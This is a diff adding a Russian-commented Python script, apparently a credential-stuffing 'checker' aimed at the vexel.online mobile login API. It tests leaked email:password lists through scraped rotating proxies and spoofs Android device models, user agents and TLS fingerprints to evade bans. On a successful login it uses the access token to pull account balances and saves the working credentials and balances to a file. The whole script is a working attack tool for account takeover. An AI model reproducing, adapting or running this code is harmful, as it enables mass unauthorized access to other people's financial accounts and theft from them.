@@ -1,0 +1,341 @@
+import json, random, string, time, hashlib, uuid, re, os, sys, threading, collections
+from concurrent.futures import ThreadPoolExecutor
+from curl_cffi import requests
+
+# --- ЦВЕТА ---
+class Color:
+    GREEN = '\033[92m'; RED = '\033[91m'; YELLOW = '\033[93m'
+    CYAN = '\033[96m'; MAGENTA = '\033[95m'; WHITE = '\033[97m'; RESET = '\033[0m'
+
+# --- КОНФИГУРАЦИЯ ---
+STAGGER_RANGE = (0.2, 0.3)      # Растянутый Stagger (0.2 - 0.5 сек)
+POST_CHECK_RANGE = (4.0, 5.0)   
+BAN_COOLDOWN = 600              
+TIMEOUT_COOLDOWN = 180          
+BAD_CONFIRMATIONS_NEEDED = 2    
+
+# Пул из 100+ реальных моделей Android
+ANDROID_MODELS = [
+    "Samsung SM-G991B", "Samsung SM-G998B", "Samsung SM-A525F", "Samsung SM-A715F", "Samsung SM-G973F", "Samsung SM-N986B", "Samsung SM-G960F", "Samsung SM-S901B", "Samsung SM-S908B", "Samsung SM-M315F",
+    "Samsung SM-A515F", "Samsung SM-A325F", "Samsung SM-G996B", "Samsung SM-F711B", "Samsung SM-F926B", "Samsung SM-A536B", "Samsung SM-A736B", "Samsung SM-S911B", "Samsung SM-S918B", "Samsung SM-M515F",
+    "Samsung SM-G780F", "Samsung SM-N975F", "Samsung SM-G950F", "Samsung SM-A125F", "Samsung SM-A225F", "Samsung SM-M127F", "Samsung SM-A037F", "Samsung SM-S906B", "Samsung SM-A505F", "Samsung SM-A705F",
+    "Samsung SM-G980F", "Samsung SM-G985F", "Samsung SM-G988B", "Samsung SM-N981B", "Samsung SM-N980F", "Samsung SM-A546B", "Samsung SM-A346B", "Samsung SM-S921B", "Samsung SM-S928B", "Samsung SM-A235F",
+    "Google Pixel 6", "Google Pixel 6 Pro", "Google Pixel 5", "Google Pixel 4a", "Google Pixel 7", "Google Pixel 7 Pro", "Google Pixel 8", "Google Pixel 8 Pro", "Google Pixel 3 XL", "Google Pixel 4 XL",
+    "Google Pixel 5a", "Google Pixel 6a", "Google Pixel 7a", "Google Pixel 3a", "Google Pixel 4", "Google Pixel 3", "Google Pixel Fold", "Google Pixel Tablet", "Google Pixel 2 XL", "Google Pixel XL",
+    "Xiaomi M2101K6G", "Xiaomi Redmi Note 10", "Xiaomi Mi 11", "Xiaomi 2201116SG", "Xiaomi M2007J3SG", "Xiaomi Redmi 9", "Xiaomi Poco X3 Pro", "Xiaomi Poco F3", "Xiaomi Mi 10T", "Xiaomi Redmi Note 8 Pro",
+    "Xiaomi Redmi Note 11", "Xiaomi 12 Pro", "Xiaomi 12T Pro", "Xiaomi 13 Ultra", "Xiaomi Redmi Note 12", "Xiaomi Poco F5", "Xiaomi Poco X5 Pro", "Xiaomi Mi 11 Ultra", "Xiaomi Mi 11 Lite", "Xiaomi Redmi 10",
+    "Xiaomi Redmi Note 9S", "Xiaomi Mi 9T Pro", "Xiaomi Poco M3", "Xiaomi Poco M4 Pro", "Xiaomi 11T Pro", "Xiaomi 12 Lite", "Xiaomi Redmi Note 11S", "Xiaomi Redmi A1", "Xiaomi Mi Note 10", "Xiaomi Black Shark 4",
+    "OnePlus BE2029", "OnePlus 9 Pro", "OnePlus 8T", "OnePlus Nord 2 5G", "OnePlus 7 Pro", "OnePlus 10 Pro", "OnePlus Nord CE", "OnePlus 6T", "OnePlus 8 Pro", "OnePlus 9RT",
+    "OnePlus 11", "OnePlus Nord 3", "OnePlus 10T", "OnePlus 7T", "OnePlus 8", "OnePlus Nord N10", "OnePlus Nord N100", "OnePlus 5T", "OnePlus Open", "OnePlus Ace 2 Pro",
+    "Huawei VOG-L29", "Huawei P30 Pro", "Huawei ELE-L29", "Huawei NOH-NX9", "Huawei CLT-L29", "Huawei POT-LX1", "Huawei ELS-NX9", "Huawei VNE-LX1", "Huawei JNY-LX1", "Huawei MAR-LX1M",
+    "Huawei Mate 40 Pro", "Huawei P40 Lite", "Huawei P20 Pro", "Huawei Nova 9", "Huawei Mate 20 Pro", "Huawei P50 Pro", "Huawei Mate 50 Pro", "Huawei P60 Pro", "Huawei Nova 10", "Huawei Mate X3",
+    "Sony XQ-AS52", "Sony XQ-BC52", "Sony G8141", "Sony J9110", "Sony XQ-AT51", "Sony XQ-AU52", "Sony H8216", "Sony SO-01K", "Sony XQ-CT54", "Sony XQ-CQ54",
+    "Sony Xperia 1 V", "Sony Xperia 5 IV", "Sony Xperia 10 V", "Sony Xperia 1 II", "Sony Xperia 5 II", "Sony Xperia 10 II", "Sony Xperia L4", "Sony Xperia XZ3", "Sony Xperia XZ2", "Sony Xperia 1 III",
+    "Motorola XT2125-4", "Motorola Moto G(9) plus", "Motorola Edge 20", "Motorola Moto G60", "Motorola Moto G30", "Motorola Moto G100", "Motorola Razr 5G", "Motorola Moto G8 Power", "Motorola One Fusion+", "Motorola Moto G50",
+    "Motorola Edge 40 Pro", "Motorola Moto G84", "Motorola Razr 40 Ultra", "Motorola Edge 30 Fusion", "Motorola Moto G73", "Motorola ThinkPhone", "Motorola Moto G power", "Motorola Edge+", "Motorola One Action", "Motorola Moto Z4",
+    "Oppo CPH2127", "Oppo CPH2025", "Oppo CPH2211", "Oppo CPH1907", "Oppo CPH2173", "Oppo CPH1877", "Oppo CPH2307", "Oppo CPH1931", "Oppo CPH2009", "Oppo CPH1903",
+    "Oppo Reno 10 Pro", "Oppo Find X6 Pro", "Oppo A98", "Oppo Reno 8T", "Oppo Find N2 Flip", "Oppo A78", "Oppo Reno 7", "Oppo Find X5 Pro", "Oppo A54", "Oppo Reno 6",
+    "Realme RMX3085", "Realme RMX2170", "Realme RMX3363", "Realme RMX1931", "Realme RMX2001", "Realme RMX3001", "Realme RMX3301", "Realme RMX3472", "Realme RMX3501", "Realme RMX1971",
+    "Realme GT 2 Pro", "Realme 11 Pro+", "Realme GT Neo 5", "Realme 10 Pro", "Realme C55", "Realme 9 Pro+", "Realme GT Master Edition", "Realme 8 Pro", "Realme 7", "Realme X2 Pro",
+    "Vivo V2025", "Vivo V2105", "Vivo V2024", "Vivo V1923A", "Vivo V2108", "Vivo V2040", "Vivo V2111", "Vivo V2110", "Vivo V2027", "Vivo V2036",
+    "Vivo X90 Pro", "Vivo V27 Pro", "Vivo Y36", "Vivo X80 Pro", "Vivo V25", "Vivo Y75", "Vivo X70 Pro", "Vivo V23 5G", "Vivo iQOO 11", "Vivo T1 5G",
+    "Asus ZS673KS", "Asus ZS590KS", "Asus ZS661KS", "Asus ZS630KL", "Asus I003D", "Asus I001DC", "Asus I005DA", "Asus I006D", "Asus ROG Phone 7", "Asus Zenfone 10",
+    "Nokia TA-1333", "Nokia TA-1085", "Nokia G42", "Nokia X30", "Nokia G21", "Nokia XR21", "Nokia 8.3 5G", "Nokia 7.2", "Nokia 5.4", "Nokia C32",
+    "LGE LGM-V300K", "LGE LM-G810", "LGE LM-V405", "LGE LM-G710", "LGE LM-V600", "LGE LM-K500", "LGE LM-Q730", "LGE LM-X410", "LGE LM-G900", "LGE LM-F100",
+    "Samsung SM-A135F", "Samsung SM-A145F", "Samsung SM-A047F", "Samsung SM-M135F", "Samsung SM-M536B", "Samsung SM-G990B", "Samsung SM-A528B", "Samsung SM-A217F", "Samsung SM-A315F", "Samsung SM-A415F",
+    "Xiaomi 23049PCD8G", "Xiaomi 22101320G", "Xiaomi 2201117TY", "Xiaomi 2201117PG", "Xiaomi 21061119DG", "Xiaomi M2101K9AG", "Xiaomi M2101K7AG", "Xiaomi M2011K2G", "Xiaomi M2012K11AG", "Xiaomi M2007J20CG",
+    "OnePlus CPH2449", "OnePlus CPH2415", "OnePlus CPH2451", "OnePlus IV2201", "OnePlus CPH2359", "OnePlus CPH2213", "OnePlus AC2003", "OnePlus HD1903", "OnePlus GM1913", "OnePlus GM1903",
+    "Huawei VOG-L09", "Huawei ELE-L09", "Huawei HMA-L29", "Huawei LYA-L29", "Huawei VTR-L29", "Huawei MHA-L29", "Huawei LON-L29", "Huawei CAN-L11", "Huawei VIE-L09", "Huawei EVA-L09",
+    "Sony XQ-DE54", "Sony XQ-DC54", "Sony XQ-CC54", "Sony XQ-BE52", "Sony XQ-BT52", "Sony XQ-AD52", "Sony J9210", "Sony G8341", "Sony G8441", "Sony G3112",
+    "Motorola XT2301-4", "Motorola XT2307-1", "Motorola XT2331-1", "Motorola XT2211-1", "Motorola XT2213-1", "Motorola XT2215-1", "Motorola XT2135-1", "Motorola XT2141-1", "Motorola XT2153-1", "Motorola XT2167-1",
+    "Oppo CPH2527", "Oppo CPH2493", "Oppo CPH2505", "Oppo CPH2447", "Oppo CPH2437", "Oppo CPH2385", "Oppo CPH2333", "Oppo CPH2269", "Oppo CPH2197", "Oppo CPH2145",
+    "Realme RMX3771", "Realme RMX3741", "Realme RMX3709", "Realme RMX3630", "Realme RMX3686", "Realme RMX3612", "Realme RMX3561", "Realme RMX3511", "Realme RMX3393", "Realme RMX3370",
+    "Vivo V2250", "Vivo V2230", "Vivo V2218", "Vivo V2202", "Vivo V2164", "Vivo V2158", "Vivo V2144", "Vivo V2130", "Vivo V2124", "Vivo V2120",
+    "Samsung SM-S711B", "Samsung SM-A057F", "Samsung SM-A055F", "Samsung SM-M446K", "Samsung SM-E546B", "Samsung SM-A245F", "Samsung SM-A256B", "Samsung SM-A155F", "Samsung SM-A156B", "Samsung SM-A356B",
+    "Xiaomi 23076RN4BI", "Xiaomi 23076PCCD8G", "Xiaomi 2306EPN60G", "Xiaomi 23053RN02Y", "Xiaomi 2303ERA42G", "Xiaomi 2212ARNC4L", "Xiaomi 22120RN40G", "Xiaomi 2211133G", "Xiaomi 22101316G", "Xiaomi 2209116AG",
+    "Google Pixel 8a", "Google Pixel 9", "Google Pixel 9 Pro", "Google Pixel 9 Pro XL", "Google Pixel 7 Pro", "Google Pixel 6 Pro", "Google Pixel 5a 5G", "Google Pixel 4a 5G", "Google Pixel XL", "Google Pixel C",
+    "OnePlus CPH2551", "OnePlus CPH2581", "OnePlus CPH2609", "OnePlus PJD110", "OnePlus PHP110", "OnePlus PHB110", "OnePlus PGKM10", "OnePlus NE2213", "OnePlus MT2111", "OnePlus LE2113",
+    "Huawei NOH-AN00", "Huawei NOP-AN00", "Huawei JAD-AL00", "Huawei JAD-LX9", "Huawei MIL-AL00", "Huawei NAM-LX9", "Huawei NEN-LX1", "Huawei GIA-LX9", "Huawei STG-LX1", "Huawei BNE-LX1",
+    "Sony XQ-DQ72", "Sony XQ-EC72", "Sony XQ-CT72", "Sony XQ-BC72", "Sony XQ-AT72", "Sony XQ-AS72", "Sony J9110", "Sony H9436", "Sony G8142", "Sony F8332",
+    "Motorola XT2309-1", "Motorola XT2321-1", "Motorola XT2341-1", "Motorola XT2343-1", "Motorola XT2201-1", "Motorola XT2221-1", "Motorola XT2223-1", "Motorola XT2225-1", "Motorola XT2231-1", "Motorola XT2233-1",
+    "Oppo PJA110", "Oppo PHN110", "Oppo PHW110", "Oppo PHP110", "Oppo PGW110", "Oppo PGP110", "Oppo PGT110", "Oppo PGZ110", "Oppo PGU110", "Oppo PFV110",
+    "Realme RMX3820", "Realme RMX3823", "Realme RMX3706", "Realme RMX3708", "Realme RMX3760", "Realme RMX3710", "Realme RMX3610", "Realme RMX3551", "Realme RMX3560", "Realme RMX3562",
+    "Vivo V2309A", "Vivo V2302A", "Vivo V2271A", "Vivo V2254A", "Vivo V2243A", "Vivo V2241A", "Vivo V2231A", "Vivo V2227A", "Vivo V2219A", "Vivo V2183A",
+    "Samsung SM-A556B", "Samsung SM-A356E", "Samsung SM-C5560", "Samsung SM-M556B", "Samsung SM-F731B", "Samsung SM-F946B", "Samsung SM-S711W", "Samsung SM-S916B", "Samsung SM-S9110", "Samsung SM-G990B2",
+    "Xiaomi 23127PN0CC", "Xiaomi 2312DRA50G", "Xiaomi 23122PCD1G", "Xiaomi 2311DRK48G", "Xiaomi 23117RK66C", "Xiaomi 23116PN5BC", "Xiaomi 23113RKC6C", "Xiaomi 23078PND5G", "Xiaomi 23054GS29G", "Xiaomi 2304FPN6DG",
+    "OnePlus CPH2573", "OnePlus CPH2513", "OnePlus CPH2487", "OnePlus CPH2417", "OnePlus CPH2399", "OnePlus CPH2371", "OnePlus CPH2201", "OnePlus CPH2195", "OnePlus CPH2197", "OnePlus CPH2021",
+    "Huawei ALN-AL00", "Huawei ALN-AL10", "Huawei MNA-AL00", "Huawei LNA-AL00", "Huawei ROC-AL00", "Huawei VOG-AL00", "Huawei ELE-AL00", "Huawei HMA-AL00", "Huawei LYA-AL00", "Huawei EVR-AL00",
+    "Sony XQ-DS54", "Sony XQ-CB54", "Sony XQ-BT52", "Sony XQ-AQ52", "Sony XZ Premium", "Sony Xperia 1", "Sony Xperia 5", "Sony Xperia 10", "Sony Xperia XZ2 Premium", "Sony Xperia XZ1",
+    "Motorola XT2401-1", "Motorola XT2403-1", "Motorola XT2421-1", "Motorola XT2423-1", "Motorola XT2425-1", "Motorola XT2303-1", "Motorola XT2305-1", "Motorola XT2311-1", "Motorola XT2313-1", "Motorola XT2315-1",
+    "Oppo CPH2581", "Oppo CPH2577", "Oppo CPH2557", "Oppo CPH2531", "Oppo CPH2529", "Oppo CPH2521", "Oppo CPH2515", "Oppo CPH2513", "Oppo CPH2477", "Oppo CPH2469",
+    "Realme RMX3888", "Realme RMX3866", "Realme RMX3840", "Realme RMX3842", "Realme RMX3782", "Realme RMX3785", "Realme RMX3740", "Realme RMX3711", "Realme RMX3690", "Realme RMX3630",
+    "Vivo V2318", "Vivo V2317", "Vivo V2313", "Vivo V2312", "Vivo V2310", "Vivo V2303", "Vivo V2247", "Vivo V2246", "Vivo V2244", "Vivo V2239",
+    "Samsung SM-A057G", "Samsung SM-A055M", "Samsung SM-M146B", "Samsung SM-M145F", "Samsung SM-E146B", "Samsung SM-A256E", "Samsung SM-A155M", "Samsung SM-A156M", "Samsung SM-A356M", "Samsung SM-A556M",
+    "Xiaomi 23129PR50G", "Xiaomi 23124RA7EO", "Xiaomi 23122PCD1I", "Xiaomi 2311DRK48I", "Xiaomi 23117RK66I", "Xiaomi 23116PN5BI", "Xiaomi 23113RKC6I", "Xiaomi 23078PND5I", "Xiaomi 23054GS29I", "Xiaomi 2304FPN6DI",
+    "Nokia XR25", "Nokia G42 5G", "Nokia C210", "Nokia C110", "Nokia G310 5G", "Nokia G110", "Nokia X20", "Nokia X10", "Nokia G50", "Nokia G20"
+]
+
+OKHTTP_VERSIONS = [
+    "4.9.0", "4.9.1", "4.9.2", "4.9.3", "4.10.0", "4.11.0", "4.12.0", 
+    "5.0.0-alpha.1", "5.0.0-alpha.2", "5.0.0-alpha.3", "5.0.0-alpha.6", 
+    "5.0.0-alpha.10", "5.0.0-alpha.11", "5.0.0-alpha.12", "5.0.0-alpha.14"
+]
+
+# Пул TLS отпечатков (ТОЛЬКО CHROMIUM для стабильности)
+TLS_PROFILES = ["chrome110", "chrome116", "chrome119", "chrome120", "chrome124"]
+
+# --- ГЛОБАЛЬНЫЕ ОБЪЕКТЫ ---
+print_lock = threading.Lock()
+save_lock = threading.Lock()
+proxy_lock = threading.Lock()
+stats_lock = threading.Lock()
+pause_event = threading.Event() 
+pause_event.set() 
+
+stats = {'good': 0, 'bad': 0, 'banned': 0, 'left': 0, 'proxies_count': 0, 'fail_streak': 0, 'paused_once': False}
+all_proxies = [] 
+banned_proxies = {} 
+global_stop = False
+
+def log(msg, color=Color.WHITE):
+    if not pause_event.is_set() and "[GOOD]" not in msg and "[BAD]" not in msg and "[BANNED]" not in msg: return
+    with print_lock:
+        sys.stdout.write(f"\r{color}{msg}{Color.RESET}\n")
+        sys.stdout.flush()
+
+# --- СИСТЕМА ОБНОВЛЕНИЯ ПРОКСИ ---
+
+def proxy_refresher():
+    global all_proxies
+    proxy_re = re.compile(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{1,5}')
+    sources = [
+        ("socks5", "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all"),
+        ("socks5", "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt"),
+        ("socks5", "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt"),
+        ("socks5", "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt"),
+        ("socks5", "https://raw.githubusercontent.com/rooster127/proxy-list/main/socks5.txt"),
+        ("socks5", "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt"),
+        ("socks5", "https://spys.me/socks.txt"),
+        ("socks4", "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=10000&country=all"),
+        ("socks4", "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt"),
+        ("socks4", "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt"),
+        ("http", "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"),
+        ("http", "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt"),
+        ("http", "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt"),
+        ("http", "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt"),
+        ("http", "https://spys.me/proxy.txt"),
+        ("socks5", "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/all/data.txt"),
+        ("socks5", "https://raw.githubusercontent.com/jetkai/proxy-list/main/archive/proxies.txt"),
+        ("socks5", "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt")
+    ]
+    import requests as r_simple
+    while not global_stop:
+        new_proxies_set = set()
+        for proto, url in sources:
+            try:
+                resp = r_simple.get(url, timeout=15)
+                if resp.status_code == 200:
+                    found = proxy_re.findall(resp.text)
+                    for p in found: new_proxies_set.add(f"{proto}://{p}")
+            except: continue
+        if new_proxies_set:
+            with proxy_lock:
+                all_proxies = list(new_proxies_set)
+                stats['proxies_count'] = len(all_proxies)
+            log(f"[SYSTEM] База обновлена: {len(all_proxies)} уникальных прокси.", Color.CYAN)
+        time.sleep(120)
+
+# --- СИСТЕМА АВТОСОХРАНЕНИЯ ---
+
+def get_history_path(base_file_path):
+    return f".vexel_history_{os.path.basename(base_file_path)}.txt"
+
+def load_history(history_path):
+    if os.path.exists(history_path):
+        with open(history_path, 'r', encoding='utf-8') as f:
+            return set(line.strip() for line in f)
+    return set()
+
+def add_to_history(history_path, account_line):
+    with save_lock:
+        with open(history_path, 'a', encoding='utf-8') as f:
+            f.write(account_line + "\n")
+
+# --- КЛАСС ЧЕКЕРА ---
+
+class VexelChecker:
+    def __init__(self, email, password, p_threads, history_path, full_line):
+        self.email = email
+        self.password = password
+        self.p_threads = p_threads
+        self.history_path = history_path
+        self.full_line = full_line
+        self.found = False
+        self.lock = threading.Lock()
+        self.bad_confirmations = 0
+        
+        # --- ГЕНЕРАЦИЯ УНИКАЛЬНОЙ ПЕРСОНЫ (Email-seeded) ---
+        acc_seed = int(hashlib.md5(self.email.lower().encode()).hexdigest(), 16)
+        r_gen = random.Random(acc_seed)
+        
+        self.device_model = r_gen.choice(ANDROID_MODELS)
+        self.ua = f"okhttp/{r_gen.choice(OKHTTP_VERSIONS)}"
+        self.device_id = str(uuid.uuid5(uuid.NAMESPACE_DNS, self.email.lower()))
+        self.tls_profile = r_gen.choice(TLS_PROFILES)
+
+    def check_proxy(self, proxy_str):
+        if self.found or not pause_event.is_set() or global_stop: return
+        if proxy_str in banned_proxies:
+            ts, b_type = banned_proxies[proxy_str]
+            limit = BAN_COOLDOWN if b_type == '403' else TIMEOUT_COOLDOWN
+            if time.time() - ts < limit: return
+
+        try:
+            session = requests.Session(impersonate=self.tls_profile)
+            session.proxies = {"http": proxy_str, "https": proxy_str}
+            
+            headers = {
+                "Host": "vexel.online",
+                "Connection": "Keep-Alive",
+                "Accept-Encoding": "gzip",
+                "User-Agent": self.ua,
+                "X-Device-Id": self.device_id,
+                "x-device-platform": "Android",
+                "X-Device-Model": self.device_model,
+                "Content-Type": "application/json; charset=utf-8"
+            }
+            
+            # Header Jitter: Рандомный DNT заголовок
+            if random.random() > 0.5:
+                headers["DNT"] = "1"
+            
+            payload = {"email": self.email, "password": self.password, "lang": "ru"}
+            resp = session.post("https://vexel.online/api/v2/auth/newlogin", 
+                                data=json.dumps(payload, separators=(',', ':')), 
+                                headers=headers, timeout=12)
+            
+            if resp.status_code == 200:
+                if '"access_token":"' in resp.text:
+                    with self.lock:
+                        if self.found: return
+                        self.found = True
+                    token = resp.json()['data']['access_token']
+                    headers["Authorization"] = f"Bearer {token}"
+                    acc_res = session.post("https://vexel.online/api/v2/accounts", 
+                                           data=json.dumps({"operation": "accountGetList"}, separators=(',', ':')), 
+                                           headers=headers, timeout=10)
+                    balances = " | ".join(re.findall(r'"name"(.*?),"overdraft"', acc_res.text)).replace('":"', ':').replace('"', '').strip(': ')
+                    log(f"[GOOD] {self.email}:{self.password} | {balances}", Color.GREEN)
+                    with save_lock:
+                        with open("success.txt", "a", encoding="utf-8") as f: f.write(f"{self.email}:{self.password} | {balances}\n")
+                    add_to_history(self.history_path, self.full_line)
+                    with stats_lock: stats['good'] += 1; stats['fail_streak'] = 0 
+
+                elif '"status":0' in resp.text:
+                    data = resp.json()
+                    err_code = data.get('error', {}).get('code')
+                    if err_code in [401, 424]:
+                        with self.lock:
+                            if err_code == 401:
+                                self.bad_confirmations += 1
+                                if self.bad_confirmations < BAD_CONFIRMATIONS_NEEDED: return
+                            if self.found: return
+                            self.found = True
+                        if err_code == 424:
+                            log(f"[BANNED] {self.email}:{self.password}", Color.MAGENTA)
+                            with save_lock:
+                                with open("banned.txt", "a", encoding="utf-8") as f: f.write(f"{self.email}:{self.password}\n")
+                        else:
+                            log(f"[BAD] {self.email}:{self.password}", Color.RED)
+                            with save_lock:
+                                with open("bad.txt", "a", encoding="utf-8") as f: f.write(f"{self.email}:{self.password}\n")
+                        add_to_history(self.history_path, self.full_line)
+                        with stats_lock: 
+                            if err_code == 424: stats['banned'] += 1
+                            else: stats['bad'] += 1
+                            stats['fail_streak'] = 0
+            elif resp.status_code == 403:
+                banned_proxies[proxy_str] = (time.time(), '403')
+        except: 
+            banned_proxies[proxy_str] = (time.time(), 'timeout')
+
+    def run(self):
+        global global_stop
+        if global_stop: return
+        pause_event.wait() 
+        with proxy_lock:
+            current_proxies = random.sample(all_proxies, min(len(all_proxies), 1000))
+        with ThreadPoolExecutor(max_workers=self.p_threads) as executor:
+            for p in current_proxies:
+                if self.found or global_stop: break
+                executor.submit(self.check_proxy, p)
+                time.sleep(random.uniform(*STAGGER_RANGE))
+        if not self.found and not global_stop:
+            with stats_lock:
+                stats['fail_streak'] += 1
+                current_streak = stats['fail_streak']
+            log(f"[FAIL {current_streak}/10] {self.email}", Color.YELLOW)
+            with save_lock:
+                with open("failed_to_check.txt", "a", encoding="utf-8") as f: f.write(f"{self.email}:{self.password}\n")
+            add_to_history(self.history_path, self.full_line)
+            if current_streak >= 10:
+                if stats['paused_once']:
+                    log("\n" + "!"*60, Color.RED)
+                    log("ОСТАНОВКА: Повторная серия из 10 FAIL после паузы.", Color.RED)
+                    global_stop = True
+                else:
+                    stats['paused_once'] = True
+                    self.trigger_auto_pause()
+        time.sleep(random.uniform(*POST_CHECK_RANGE))
+        with stats_lock: stats['left'] -= 1
+
+    def trigger_auto_pause(self):
+        if not pause_event.is_set(): return
+        pause_event.clear()
+        def countdown():
+            for i in range(2400, 0, -1):
+                if global_stop: break
+                mins, secs = divmod(i, 60)
+                sys.stdout.write(f"\r{Color.YELLOW}[!!!] ПАУЗА (10 FAIL). Ждем обновления IP: {mins:02d}:{secs:02d} {Color.RESET}")
+                sys.stdout.flush()
+                time.sleep(1)
+            with stats_lock: stats['fail_streak'] = 0
+            pause_event.set()
+            if not global_stop: log("\n[>>>] Работа возобновлена!", Color.CYAN)
+        threading.Thread(target=countdown, daemon=True).start()
+
+def main():
+    global all_proxies, global_stop
+    os.system('cls' if os.name == 'nt' else 'clear')
+    log("=== VEXEL MOBILE TURBO (ULTIMATE STEALTH PRO) ===", Color.CYAN)
+    path = input("\nПеретяните файл с аккаунтами: ").strip().replace('"', '').replace("'", "")
+    if not os.path.exists(path): return
+    history_file = get_history_path(path)
+    history_data = load_history(history_file)
+    with open(path, "r", encoding="utf-8") as f:
+        all_accounts = [l.strip() for l in f if ":" in l]
+    if history_data:
+        log(f"\n[!] Найдена история: {len(history_data)} аккаунтов.", Color.YELLOW)
+        if input("Продолжить (y/n)? ").lower() == 'y':
+            all_accounts = [acc for acc in all_accounts if acc not in history_data]
+        else:
+            if os.path.exists(history_file): os.remove(history_file)
+    if not all_accounts: return
+    threading.Thread(target=proxy_refresher, daemon=True).start()
+    while not all_proxies: time.sleep(1)
+    try:
+        max_accs = int(input("Параллельных аккаунтов (30): "))
+        threads_per_acc = int(input("Прокси на 1 аккаунт (50): "))
+    except: max_accs, threads_per_acc = 30, 50
+    stats['left'] = len(all_accounts)
+    with ThreadPoolExecutor(max_workers=max_accs) as acc_executor:
+        for acc_line in all_accounts:
+            if global_stop: break
+            u, p = acc_line.split(":", 1)
+            acc_executor.submit(VexelChecker(u, p, threads_per_acc, history_file, acc_line).run)
+    while not global_stop and stats['left'] > 0: time.sleep(1)
+    log("\n--- РАБОТА ЗАВЕРШЕНА ---", Color.CYAN)
+    input("Нажмите Enter для выхода...")
+
+if __name__ == "__main__":
+    main()
